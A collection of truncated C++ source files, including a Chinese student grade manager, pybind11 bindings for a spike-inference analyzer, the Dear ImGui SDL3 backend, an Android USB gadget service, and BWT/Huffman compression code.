    "#include <iostream>\n#include <string>\n#include <iomanip>\nusing namespace std;\n\n// \u5b9a\u4e49\u4e00\u4e2a\u5b66\u751f\u6210\u7ee9\u7ed3\u6784\u4f53\nstruct score\n{\n    double chinese;\n    double math;\n    double english;\n    double physics;\n    double chemistry;\n    double biology;\n    double sum;\n    int list;\n};\n\n// \u5b9a\u4e49\u4e00\u4e2a\u5b66\u751f\u5217\u8868\u7ed3\u6784\u4f53\nstruct student\n{\n    long long id;\n    string name;\n    struct score studentsScore;\n};\n\n// \u5b9a\u4e49\u4e00\u4e2a\u5b66\u751f\u7ba1\u7406\u7cfb\u7edf\u7ed3\u6784\u4f53\nstruct manager\n{\n    int number;\n    struct student studentList[30];\n};\n\n// \u4e3b\u754c\u9762\u51fd\u6570\nvoid main_Menu()\n{\n    cout << \"==================\u4f60\u5e72\u561b\u54ce\u5466=================\" << endl;\n    cout << \"This system is wirtten by:Monica:) ,plase click\ud83d\udc49 \u9a91\u5c0f\u7535\u9a74\u6d6a\u8ff9\u5929\u6daf\" << endl;\n    cout << \"1 ----->\u5f55\u5165\u6bcf\u4e2a\u5b66\u751f\u7684\u5b66\u53f7\u3001\u59d3\u540d\u548c\u5404\u79d1\u8003\u8bd5\u6210\u7ee9<-------------------------------------------------------------------\" << endl;\n    cout << \"2 ----->\u8ba1\u7b97\u6bcf\u95e8\u8bfe\u7a0b\u7684\u603b\u5206\u548c\u5e73\u5747\u5206<------------------------------------------------------------------------------\" << endl;\n    cout << \"3 ----->\u8ba1\u7b97\u6bcf\u4e2a\u5b66\u751f\u7684\u603b\u5206\u548c\u5e73\u5747\u5206<------------------------------------------------------------------------------\" << endl;\n    cout << \"4 ----->\u6309\u6bcf\u4e2a\u5b66\u751f\u7684\u603b\u5206\u7531\u9ad8\u5230\u4f4e\u6392\u51fa\u540d\u6b21\u8868<-----------------------------------------------------------------------\" << endl;\n    cout << \"5 ----->\u6309\u6bcf\u4e2a\u5b66\u751f\u7684\u603b\u5206\u7531\u4f4e\u5230\u9ad8\u6392\u51fa\u540d\u6b21\u8868<-----------------------------------------------------------------------\" << endl;\n    cout << \"6 ----->\u6309\u5b66\u53f7\u7531\u5c0f\u5230\u5927\u6392\u51fa\u6210\u7ee9\u8868<--------------------------------------------------------------------------------\" << endl;\n    cout << \"7 ----->\u6309\u59d3\u540d\u7684\u5b57\u5178\u987a\u5e8f\u6392\u51fa\u6210\u7ee9\u8868<------------------------------------------------------------------------------\" << endl;\n    cout << \"8 ----->\u6309\u5b66\u53f7\u67e5\u8be2\u5b66\u751f\u6392\u540d\u53ca\u5176\u8003\u8bd5\u6210\u7ee9<--------------------------------------------------------------------------\" << endl;\n    cout << \"9 ----->\u6309\u59d3\u540d\u67e5\u8be2\u5b66\u751f\u6392\u540d\u53ca\u5176\u8003\u8bd5\u6210\u7ee9<--------------------------------------------------------------------------\" << endl;\n    cout << \"10 ----->\u6309\u4f18\u79c0\u3001\u826f\u597d\u3001\u4e2d\u7b49\u3001\u53ca\u683c\u3001\u4e0d\u53ca\u683c\uff0c\u5bf9\u6bcf\u95e8\u8bfe\u7a0b\u5206\u522b\u7edf\u8ba1\u6bcf\u4e2a\u7c7b\u522b\u7684\u4eba\u6570\u4ee5\u53ca\u6240\u5360\u7684\u767e\u5206\u6bd4<--------------------------\" << endl;\n    cout << \"11 ----->\u8f93\u51fa\u6bcf\u4e2a\u5b66\u751f\u7684\u5b66\u53f7\u3001\u59d3\u540d\u3001\u5404\u79d1\u8003\u8bd5\u6210\u7ee9\uff0c\u4ee5\u53ca\u6bcf\u95e8\u8bfe\u7a0b\u7684\u603b\u5206\u548c\u5e73\u5747\u5206<----------------------------------------\" << endl;\n    cout << \"0 EXIT \u9000\u51fa\u7a0b\u5e8f\" << endl;\n    cout << \"==================\u54ce\u5466\u4f60\u5e72\u561b=================\" << endl;\n    cout << \"\u8bf7\u8f93\u5165\u6570\u5b57\u8fdb\u884c\u60a8\u60f3\u8981\u7684\u64cd\u4f5c\uff1a\" << endl;\n}\n\n// 01\u5f55\u5165\u529f\u80fd\nvoid signIn(manager *studentManager)\n{\n    cout << \"\u8bf7\u6309\u7167\u987a\u5e8f\u4f9d\u6b21\u8f93\u5165\u6bcf\u4f4d\u5b66\u751f\u7684\u5b66\u53f7\u3001\u59d3\u540d\u3001\u5404\u79d1\u6210\u7ee9\ud83d\udc49\uff1a\" << endl;\n\n    for (int i = studentManager->number; i < 30; i++)\n    {\n        cout << \"\u73b0\u5728\u8fdb\u884c\u7b2c\" << i + 1 << \"\u4f4d\u540c\u5b66\u7684\u4fe1\u606f\u5f55\u5165\uff0c\u8bf7\u8f93\u5165\u59d3\u540d\uff1a\";\n        cin >> studentManager->studentList[i].name;\n        cout << \"\u8bf7\u8f93\u5165\u5b66\u53f7\uff1a\";\n        cin >> studentManager->studentList[i].id;\n        cout << \"=======================\" << endl;\n        cout << \"========\u8bf7\u8f93\u5165\u5404\u79d1\u6210\u7ee9=========\" << endl;\n        cout << \"\u8bf7\u8f93\u5165\u8bed\u6587\u6210\u7ee9\uff1a\" << endl;\n        cin >> studentManager->studentList[i].studentsScore.chinese;\n\n        cout << \"\u8bf7\u8f93\u5165\u6570\u5b66\u6210\u7ee9\uff1a\" << endl;\n        cin >> studentManager->studentList[i].studentsScore.math;\n\n        cout << \"\u8bf7\u8f93\u5165\u82f1\u8bed\u6210\u7ee9\uff1a\" << endl;\n        cin >> studentManager->studentList[i].studentsScore.english;\n\n        cout << \"\u8bf7\u8f93\u5165\u7269\u7406\u6210\u7ee9\uff1a\" << endl;\n        cin >> studentManager->studentList[i].studentsScore.physics;\n\n        cout << \"\u8bf7\u8f93\u5165\u5316\u5b66\u6210\u7ee9\uff1a\" << endl;\n        cin >> studentManager->studentList[i].studentsScore.chemistry;\n\n        cout << \"\u8bf7\u8f93\u5165\u751f\u7269\u6210\u7ee9\uff1a\" << endl;\n        cin >> studentManager->studentList[i].studentsScore.biology;\n\n        studentManager->number++;\n\n        while (true)\n        {\n            cout << \"\u7b2c\" << studentManager->number << \"\u4f4d\u5b66\u751f\u4fe1\u606f\u5f55\u5165\u6210\u529f\uff01\u73b0\u5728\u662f\u5426\u8fdb\u884c\u4e0b\u4e00\u4f4d\u540c\u5b66\u4fe1\u606f\u5f55\u5165\uff1f\u8bf7\u8f93\u5165[y/n]\uff1f\" << endl;\n            string chance;\n            cin >> chance;\n\n            if (chance == \"y\")\n            {\n                break;\n            }\n            else if (chance == \"n\")\n            {\n                i = 30;\n                break;\n            }\n            else\n            {\n                cout << \"\u8b66\u544a\uff1a\u8bf7\u6309\u7167\u8981\u6c42\u8f93\u5165\uff01\uff01\uff01\uff01\" << endl;\n                continue;\n            }\n        }\n    }\n    cout << \"========\u6240\u6709\u4fe1\u606f\u5f55\u5165\u6210\u529f!\u6309ENTER\u952e\u8fd4\u56de\u5230\u4e3b\u9875\u9762\uff01=========\" << endl;\n}\n\n// 02\u8ba1\u7b97\u5404\u4e2a\u79d1\u7684\u603b\u5206\u548c\u5e73\u5747\u503c\nvoid AllScore(manager *studentManager)\n{\n    double average[6] = {0};\n    if (studentManager->number == 0)\n    {\n        cout << \"\u5b66\u751f\u5217\u8868\u4e3a\u7a7a\uff01\u8bf7\u6dfb\u52a0\u5b66\u751f\u5217\u8868\u518d\u8fdb\u884c\u64cd\u4f5c\uff01\" << endl;\n    }\n    else\n    {\n        cout << \"\u6b63\u5728\u8ba1\u7b97\u5404\u4e2a\u79d1\u76ee\u7684\u603b\u5206\u5e73\u5747\u503c\u4e2d.........\" << endl;\n        for (int j = 0; j < studentManager->number; j++)\n        {\n            average[0] += studentManager->studentList[j].studentsScore.chinese;\n            average[1] += studentManager->studentList[j].studentsScore.math;\n            average[2] += studentManager->studentList[j].studentsScore.english;\n            average[3] += studentManager->studentList[j].studentsScore.physics;\n            average[4] += studentManager->studentList[j].studentsScore.chemistry;\n            average[5] += studentManager->studentList[j].studentsScore.biology;\n        }\n        cout << \"\u5404\u4e2a\u79d1\u76ee\u7684\u603b\u5206\u5e73\u5747\u503c\u8ba1\u7b97\u6210\u529f\uff01\u7ed3\u679c\u5982\u4e0b\uff1a\" << endl;\n        cout << \"\u603b\u5171\u6709\" << studentManager->number << \"\u4f4d\u5b66\u751f:\" << endl;\n        cout << \"\u8bed\u6587\u5e73\u5747\u5206\uff1a\" << fixed << setprecision(2) << average[0] / double(studentManager->number) << endl;\n        cout << \"\u6570\u5b66\u5e73\u5747\u5206\uff1a\" << fixed << setprecision(2) << average[1] / double(studentManager->number) << endl;\n        cout << \"\u82f1\u8bed\u5e73\u5747\u5206\uff1a\" << fixed << setprecision(2) << average[2] / double(studen",
    "//Required pybind libraries for expected conversions\r\n#include <pybind11/pybind11.h>\r\n#include <pybind11/stl.h>\r\n#include <pybind11/numpy.h>\r\n//External libraries called by pgas\r\n#include <armadillo>\r\n#include <gsl/gsl_rng.h>\r\n#include <gsl/gsl_randist.h>\r\n#include <cmath>\r\n#include <json/json.h>\r\n#include <fstream>\r\n#include <iostream>\r\n//Type conversion for armadillo library in pybind11\r\n#include \"include/arma_pybind11.h\"\r\n//Bound modules\r\n#include \"include/Analyzer.h\"\r\n//In case any other functions or classes need to be exposed to python\r\n#include \"include/GCaMP_model.h\"\r\n/*#include \"include/constants.h\"\r\n#include \"include/mvn.h\"\r\n#include \"include/param.h\"\r\n#include \"include/particle.h\"\r\n#include \"include/utils.h\"*/\r\n\r\n\r\nnamespace py = pybind11;\r\n\r\n//method to extract final array entries as numpy array\r\npy::array_t<double> get_final_params(Analyzer& analyzer) {\r\n  // Create a NumPy array from the std::vector\r\n  py::array_t<double> result(analyzer.final_params.size());\r\n  std::copy(analyzer.final_params.begin(), analyzer.final_params.end(), result.mutable_data());\r\n  return result;\r\n}\r\n\r\nPYBIND11_MODULE(pgas_bound, m) {\r\n\t// bindings for Analyzer.cpp\r\n\t\tpy::class_<Analyzer>(m, \"Analyzer\")\r\n        .def(py::init<const std::string&, const std::string&, const std::string&, unsigned int, const std::string&, unsigned int,\r\n                      const std::string&, bool, unsigned int, bool, const std::string&, bool, bool, unsigned int, const std::string&>(),\r\n             py::arg(\"data_file\"), py::arg(\"constants_file\"), py::arg(\"output_folder\"), py::arg(\"column\"), py::arg(\"tag\"),\r\n             py::arg(\"niter\") = 0, py::arg(\"trainedPriorFile\") = \"\", py::arg(\"append\") = false, py::arg(\"trim\") = 1,\r\n             py::arg(\"verbose\") = true, py::arg(\"gtSpike_file\") = \"\", py::arg(\"has_trained_priors\") = false, py::arg(\"has_gtspikes\") = false,\r\n             py::arg(\"maxlen\") = 0, py::arg(\"Gparam_file\") = \"\")\r\n        .def(\"run\", &Analyzer::run)\r\n\t\t\t\t.def(\"get_final_params\", &get_final_params, \"Get final parameters as a NumPy array\");\r\n\t\r\n\t//In case any other functions or classes need to be exposed to python during future iterations\r\n\t/*// bindings for constants.cpp\r\n    py::class_<constpar>(m, \"constpar\")\r\n        .def(py::init<const std::string &>())\r\n        .def(\"print\", &constpar::print)\r\n        .def_readwrite(\"bm_sigma\", &constpar::bm_sigma)\r\n        .def_readwrite(\"alpha_sigma2\", &constpar::alpha_sigma2)\r\n        .def_readwrite(\"beta_sigma2\", &constpar::beta_sigma2)\r\n        .def_readwrite(\"alpha_rate_b0\", &constpar::alpha_rate_b0)\r\n        .def_readwrite(\"beta_rate_b0\", &constpar::beta_rate_b0)\r\n        .def_readwrite(\"alpha_rate_b1\", &constpar::alpha_rate_b1)\r\n        .def_readwrite(\"beta_rate_b1\", &constpar::beta_rate_b1)\r\n        .def_readwrite(\"alpha_w01\", &constpar::alpha_w01)\r\n        .def_readwrite(\"beta_w01\", &constpar::beta_w01)\r\n        .def_readwrite(\"alpha_w10\", &constpar::alpha_w10)\r\n        .def_readwrite(\"beta_w10\", &constpar::beta_w10)\r\n        .def_readwrite(\"G_tot_mean\", &constpar::G_tot_mean)\r\n        .def_readwrite(\"G_tot_sd\", &constpar::G_tot_sd)\r\n        .def_readwrite(\"gamma_mean\", &constpar::gamma_mean)\r\n        .def_readwrite(\"gamma_sd\", &constpar::gamma_sd)\r\n        .def_readwrite(\"DCaT_mean\", &constpar::DCaT_mean)\r\n        .def_readwrite(\"DCaT_sd\", &constpar::DCaT_sd)\r\n        .def_readwrite(\"Rf_mean\", &constpar::Rf_mean)\r\n        .def_readwrite(\"Rf_sd\", &constpar::Rf_sd)\r\n        .def_readwrite(\"gam_in_mean\", &constpar::gam_in_mean)\r\n        .def_readwrite(\"gam_in_sd\", &constpar::gam_in_sd)\r\n        .def_readwrite(\"gam_out_mean\", &constpar::gam_out_mean)\r\n        .def_readwrite(\"gam_out_sd\", &constpar::gam_out_sd)\r\n        .def_readwrite(\"G_tot_prop_sd\", &constpar::G_tot_prop_sd)\r\n        .def_readwrite(\"gamma_prop_sd\", &constpar::gamma_prop_sd)\r\n        .def_readwrite(\"DCaT_prop_sd\", &constpar::DCaT_prop_sd)\r\n        .def_readwrite(\"Rf_prop_sd\", &constpar::Rf_prop_sd)\r\n        .def_readwrite(\"gam_in_prop_sd\", &constpar::gam_in_prop_sd)\r\n        .def_readwrite(\"gam_out_prop_sd\", &constpar::gam_out_prop_sd)\r\n        .def_readwrite(\"sampling_frequency\", &constpar::sampling_frequency)\r\n        .def_readwrite(\"MOVE_SPIKES\", &constpar::MOVE_SPIKES)\r\n        .def_readwrite(\"SAMPLE_KINETICS\", &constpar::SAMPLE_KINETICS)\r\n        .def_readwrite(\"SAMPLE_SPIKES\", &constpar::SAMPLE_SPIKES)\r\n        .def_readwrite(\"SAMPLE_PARAMETERS\", &constpar::SAMPLE_PARAMETERS)\r\n        .def_readwrite(\"CROP_TRACE\", &constpar::CROP_TRACE)\r\n        .def_readwrite(\"KNOWN_SPIKES\", &constpar::KNOWN_SPIKES)\r\n        .def_readwrite(\"seed\", &constpar::seed)\r\n        .def_readwrite(\"niter\", &constpar::niter)\r\n        .def_readwrite(\"nparticles\", &constpar::nparticles)\r\n        .def_readwrite(\"t_min\", &constpar::t_min)\r\n        .def_readwrite(\"t_max\", &constpar::t_max)\r\n        .def_readwrite(\"baseline_frames\", &constpar::baseline_frames)\r\n        .def_readwrite(\"nospike_before\", &constpar::nospike_before)\r\n        .d",
    "// dear imgui: Platform Backend for SDL3 (*EXPERIMENTAL*)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n// (Info: SDL3 is a cross-platform general purpose library for handling windows, inputs, graphics context creation, etc.)\n// (IMPORTANT: SDL 3.0.0 is NOT YET RELEASED. IT IS POSSIBLE THAT ITS SPECS/API WILL CHANGE BEFORE RELEASE)\n\n// Implemented features:\n//  [X] Platform: Clipboard support.\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen.\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy SDL_SCANCODE_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n// Missing features:\n//  [ ] Platform: IME SUPPORT IS BROKEN IN SDL3 BECAUSE INPUTS GETS SENT TO BOTH APP AND IME + app needs to call 'SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");' before SDL_CreateWindow()!.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-04-15: Inputs: Re-enable calling SDL_StartTextInput()/SDL_StopTextInput() as SDL3 no longer enables it by default and should play nicer with IME.\n//  2024-02-13: Inputs: Fixed gamepad support. Handle gamepad disconnection. Added ImGui_ImplSDL3_SetGamepadMode().\n//  2023-11-13: Updated for recent SDL3 API changes.\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys, app back/forward keys.\n//  2023-05-04: Fixed build on Emscripten/iOS/Android. (#6391)\n//  2023-04-06: Inputs: Avoid calling SDL_StartTextInput()/SDL_StopTextInput() as they don't only pertain to IME. It's unclear exactly what their relation is to IME. (#6306)\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen. (#2702)\n//  2023-02-23: Accept SDL_GetPerformanceCounter() not returning a monotonically increasing value. (#6189, #6114, #3644)\n//  2023-02-07: Forked \"imgui_impl_sdl2\" into \"imgui_impl_sdl3\". Removed version checks for old feature. Refer to imgui_impl_sdl2.cpp for older changelog.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_sdl3.h\"\n\n// Clang warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#endif\n\n// SDL\n#include <SDL3/SDL.h>\n#if defined(__APPLE__)\n#include <TargetConditionals.h>\n#endif\n#ifdef _WIN32\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#endif\n\n#if !defined(__EMSCRIPTEN__) && !defined(__ANDROID__) && !(defined(__APPLE__) && TARGET_OS_IOS) && !defined(__amigaos4__)\n#define SDL_HAS_CAPTURE_AND_GLOBAL_MOUSE    1\n#else\n#define SDL_HAS_CAPTURE_AND_GLOBAL_MOUSE    0\n#endif\n\n// FIXME-LEGACY: remove when SDL 3.1.3 preview is released.\n#ifndef SDLK_APOSTROPHE\n#define SDLK_APOSTROPHE SDLK_QUOTE\n#endif\n#ifndef SDLK_GRAVE\n#define SDLK_GRAVE SDLK_BACKQUOTE\n#endif\n\n// SDL Data\nstruct ImGui_ImplSDL3_Data\n{\n    SDL_Window*             Window;\n    SDL_Renderer*           Renderer;\n    Uint64                  Time;\n    char*                   ClipboardTextData;\n\n    // Mouse handling\n    Uint32                  MouseWindowID;\n    int                     MouseButtonsDown;\n    SDL_Cursor*             MouseCursors[ImGuiMouseCursor_COUNT];\n    SDL_Cursor*             MouseLastCursor;\n    int                     MousePendingLeaveFrame;\n    bool                    MouseCanUseGlobalState;\n\n    // Gamepad handling\n    ImVector<SDL_Gamepad*>      Gamepads;\n    ImGui_ImplSDL3_GamepadMode  GamepadMode;\n    bool                        WantUpdateGamepadsList;\n\n    ImGui_ImplSDL3_Data()   { memset((void*)this, 0, sizeof(*this)); }\n};\n\n// Backend data stored in io.BackendPlatformUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\n// FIXME: multi-context support is not well tested and probably dysfunctional in this backend.\n// FIXM",
    "#include \"SystemUtilities.h\"\n\n//-----------------------------------------------------------------------------\n// errlog\n// ----------------------------------------------------------------------------\n// Prints a message to stderr\n//-----------------------------------------------------------------------------\nvoid \nerrlog \n(\n    const char *msg, \n    ...\n){\n    va_list args;\n    va_start(args, msg);\n    vfprintf(stderr, msg, args);\n    va_end(args);\n}\n\n//-----------------------------------------------------------------------------\n// panicf\n// ----------------------------------------------------------------------------\n// Prints a message to stderr and exits the program with EXIT_FAILURE code.\n//-----------------------------------------------------------------------------\nvoid\npanicf\n(\n    const char* msg,\n    ...\n){\n    va_list args;\n    va_start(args, msg);\n    vfprintf(stderr, msg, args);\n    va_end(args);\n    std::exit(EXIT_FAILURE);\n}\n\n//-----------------------------------------------------------------------------\n// quit\n// ----------------------------------------------------------------------------\n// Exits the program with EXIT_SUCCESS code.\n//-----------------------------------------------------------------------------\nvoid\nquit\n(\n    void\n){\n    std::exit(EXIT_SUCCESS);\n}",
    "#include<iostream>\n#include<string>\nusing namespace std;\n#define MAX_SIZE 10\nstruct Product{\n    string productId;\n    string productName;\n    string productPrice;\n};\n\nvoid displayProducts(Product productList[], int n) \n{\n    cout << \"\\nProduct List\\n\";\n    cout << \"ID\\tName\\tPrice\\n\";\n    for (int i = 0; i < n; ++i) \n\t{\n        cout << productList[i].productId << \"\\t\" << productList[i].productName << \"\\t\" << productList[i].productPrice << endl;\n    }\n    cout << endl;\n}\n\nvoid insertProduct(Product productList[], int &n, int pos, Product newProduct) \n{\n    for (int i = n; i > pos; --i) \n\t{\n        productList[i] = productList[i - 1];\n    }\n    productList[pos] = newProduct;\n    n++;\n    cout << \"Product inserted at position \" << pos << \"\\n\";\n}\n\nvoid deleteProduct(Product productList[], int &n, int pos) \n{\n    Product deletedProduct = productList[pos];\n    for (int i = pos; i < n - 1; ++i) \n\t{\n        productList[i] = productList[i + 1];\n    }\n    n--;\n    cout << \"Product deleted from position \" << pos << \"\\n\";\n}\n\nint main() \n{\n    Product productList[MAX_SIZE];\n    int n = 0;\n\n    int choice, pos;\n    Product newProduct;\n\n    while (true) \n\t{\n        cout << \"\\nProduct Management System\\n\";\n        cout << \"1. Display Products\\n\";\n        cout << \"2. Insert Product\\n\";\n        cout << \"3. Delete Product\\n\";\n        cout << \"4. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) \n\t\t{\n            case 1:\n                displayProducts(productList, n);\n                break;\n            case 2:\n                cout << \"Enter the position to insert: \";\n                cin >> pos;\n                cout << \"Enter Product ID: \";\n                cin >> newProduct.productId;\n                cout << \"Enter Product Name: \";\n                cin >> newProduct.productName;\n                cout << \"Enter Product Price: \";\n                cin >> newProduct.productPrice;\n                insertProduct(productList, n, pos, newProduct);\n                break;\n            case 3:\n                cout << \"Enter the position to delete: \";\n                cin >> pos;\n                deleteProduct(productList, n, pos);\n                break;\n            case 4:\n                cout << \"Exiting\\n\";\n                return 0;\n            default:\n                cout << \"Invalid choice\\n\";\n        }\n    }\n\n    return 0;\n}\n\n",
    "/*\n * Copyright (C) 2020 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.usb.gadget.aidl-service\"\n\n#include \"UsbGadget.h\"\n#include <dirent.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <sys/inotify.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include <android-base/properties.h>\n\n#include <aidl/android/frameworks/stats/IStats.h>\n\nnamespace aidl {\nnamespace android {\nnamespace hardware {\nnamespace usb {\nnamespace gadget {\n\nstring enabledPath;\nconstexpr char kHsi2cPath[] = \"/sys/devices/platform/10d50000.hsi2c\";\nconstexpr char kMax77759TcpcDevName[] = \"i2c-max77759tcpc\";\nconstexpr unsigned int kMax77759TcpcClientId = 0x25;\nconstexpr char kAccessoryLimitCurrent[] = \"usb_limit_accessory_current\";\nconstexpr char kAccessoryLimitCurrentEnable[] = \"usb_limit_accessory_enable\";\nconstexpr char kUpdateSdpEnumTimeout[] = \"update_sdp_enum_timeout\";\n\nusing ::android::base::GetBoolProperty;\nusing ::android::hardware::google::pixel::usb::kUvcEnabled;\n\nUsbGadget::UsbGadget() : mGadgetIrqPath(\"\"),\n      mI2cBusNumber(-1),\n      mI2cClientPath(\"\") {\n    if (access(OS_DESC_PATH, R_OK) != 0) {\n        ALOGE(\"configfs setup not done yet\");\n        abort();\n    }\n}\n\nStatus UsbGadget::getUsbGadgetIrqPath() {\n    std::string irqs;\n    size_t read_pos = 0;\n    size_t found_pos = 0;\n\n    if (!ReadFileToString(kProcInterruptsPath, &irqs)) {\n        ALOGE(\"cannot read all interrupts\");\n        return Status::ERROR;\n    }\n\n    while (true) {\n        found_pos = irqs.find_first_of(\"\\n\", read_pos);\n        if (found_pos == std::string::npos) {\n            ALOGI(\"the string of all interrupts is unexpected\");\n            return Status::ERROR;\n        }\n\n        std::string single_irq = irqs.substr(read_pos, found_pos - read_pos);\n\n        if (single_irq.find(\"dwc3\", 0) != std::string::npos) {\n            unsigned int dwc3_irq_number;\n            size_t dwc3_pos = single_irq.find_first_of(\":\");\n            if (!ParseUint(single_irq.substr(0, dwc3_pos), &dwc3_irq_number)) {\n                ALOGI(\"unknown IRQ strings\");\n                return Status::ERROR;\n            }\n\n            mGadgetIrqPath = kProcIrqPath + single_irq.substr(0, dwc3_pos) + kSmpAffinityList;\n            break;\n        }\n\n        if (found_pos == irqs.npos) {\n            ALOGI(\"USB gadget doesn't start\");\n            return Status::ERROR;\n        }\n\n        read_pos = found_pos + 1;\n    }\n\n    return Status::SUCCESS;\n}\n\nvoid currentFunctionsAppliedCallback(bool functionsApplied, void *payload) {\n    UsbGadget *gadget = (UsbGadget *)payload;\n    gadget->mCurrentUsbFunctionsApplied = functionsApplied;\n    gadget->updateSdpEnumTimeout();\n}\n\nScopedAStatus UsbGadget::getCurrentUsbFunctions(const shared_ptr<IUsbGadgetCallback> &callback,\n        int64_t in_transactionId) {\n    ScopedAStatus ret = callback->getCurrentUsbFunctionsCb(\n        mCurrentUsbFunctions,\n        mCurrentUsbFunctionsApplied ? Status::FUNCTIONS_APPLIED : Status::FUNCTIONS_NOT_APPLIED,\n        in_transactionId);\n    if (!ret.isOk())\n        ALOGE(\"Call to getCurrentUsbFunctionsCb failed %s\", ret.getDescription().c_str());\n\n    return ScopedAStatus::ok();\n}\n\nScopedAStatus UsbGadget::getUsbSpeed(const shared_ptr<IUsbGadgetCallback> &callback,\n        int64_t in_transactionId) {\n    std::string current_speed;\n    if (ReadFileToString(SPEED_PATH, &current_speed)) {\n        current_speed = Trim(current_speed);\n        ALOGI(\"current USB speed is %s\", current_speed.c_str());\n        if (current_speed == \"low-speed\")\n            mUsbSpeed = UsbSpeed::LOWSPEED;\n        else if (current_speed == \"full-speed\")\n            mUsbSpeed = UsbSpeed::FULLSPEED;\n        else if (current_speed == \"high-speed\")\n            mUsbSpeed = UsbSpeed::HIGHSPEED;\n        else if (current_speed == \"super-speed\")\n            mUsbSpeed = UsbSpeed::SUPERSPEED;\n        else if (current_speed == \"super-speed-plus\")\n            mUsbSpeed = UsbSpeed::SUPERSPEED_10Gb;\n        else if (current_speed == \"UNKNOWN\")\n            mUsbSpeed = UsbSpeed::UNKNOWN;\n        else\n            mUsbSpeed = UsbSpeed::UNKNOWN;\n    } else {\n        ALOGE(\"Fail to read current speed\");\n        mUsbSpeed = UsbSpeed::UNKNOWN;\n    }\n\n    if (callback) {\n        ScopedAStatus ret = callback->getUsbSpeedCb(mUsbSpeed, in_transactionId);\n\n        if (!ret.isOk())\n            ALOGE(\"Call to getUsbSpeedCb failed %s\", ret.getDescription().c_str());\n  ",
    "#include \"suffix.h\"\n#include <queue>\n#include <bitset>\n#include <chrono>\n\n// Burrows\u2013Wheeler Transform\nstd::string BWT(std::vector<int>& t, std::vector<int>& sa){\n    const char sentinel = '#';\n    std::string ans = \"\";\n    for(int i=0; i<sa.size(); i++){ \n        if(sa[i]==0) ans += sentinel;\n        else ans += t[sa[i]-1];\n    }\n    return ans;\n}\n\nstd::vector<int> common_dict(){\n    std::vector<int> d(256);\n    auto block32 = [](auto& v, auto a, auto b, auto off){for(int i=a;i<b;i++) v[i]=i-a+off;};\n    block32(d, 0, 32, 96);\n    block32(d, 32, 64, 64);\n    block32(d, 64, 96, 32);\n    block32(d, 96, 128, 0);\n    block32(d, 128, 256, 128);\n    return d;\n}\n\n// Move-To-Front Transformation\nstd::vector<int> MTF(std::string& s){\n    auto dict = common_dict();\n    std::vector<int> ans;\n    for(char c : s){\n        // find rank\n        short int rank;\n        for(int j=0; j<dict.size(); j++) if(dict[j]==(uint8_t)c) rank=j;\n        ans.push_back(rank);\n        // update dict\n        for(int j=rank; j>0; j--) dict[j] = dict[j-1];\n        dict[0] = (uint8_t)c;\n    }    \n    return ans;\n}\n\n// Run-Length Encoding\nstd::string RLE(std::vector<int>& v){\n    std::string ans = \"\";\n    for(int i=0; i<v.size(); i++){\n        int cnt = 1;\n        while(i+1 < v.size() && v[i] == v[i+1]) cnt++, i++;\n        ans += std::to_string(cnt);\n        ans += std::to_string(v[i]);\n    }\n    return ans;\n}\n\nclass Huffman{\npublic:\nstruct Node{\n    int idx, val, freq = 0, left=-1, right=-1;\n    Node(int f, int i, int v=0) : freq(f), idx(i), val(v){}\n    bool operator<(const Node b) const {\n        return this->freq > b.freq; // inverted because we want MINIMUM-pq\n    }\n};\nstd::vector<std::string> table_code; // code\nstd::vector<Node> tree;\nstd::string tree_comp_form;\nconst int sentinel = 255, alphabet = 256;\n\nvoid dfs(int v, std::string curr){\n    if(v == -1) return;\n    if(tree[v].left == -1 && tree[v].right == -1){\n        table_code[tree[v].val] = curr; // leaf node\n        std::bitset<8> number(tree[v].val); // i know\n        tree_comp_form += '1' + number.to_string();\n        return;\n    }\n    tree_comp_form += '0';\n    dfs(tree[v].left, curr+'0');\n    dfs(tree[v].right, curr+'1');\n}\n\n// Build Huffman tree\nvoid build(std::vector<int>& v){\n    std::priority_queue<Node> pq;\n    std::vector<int> 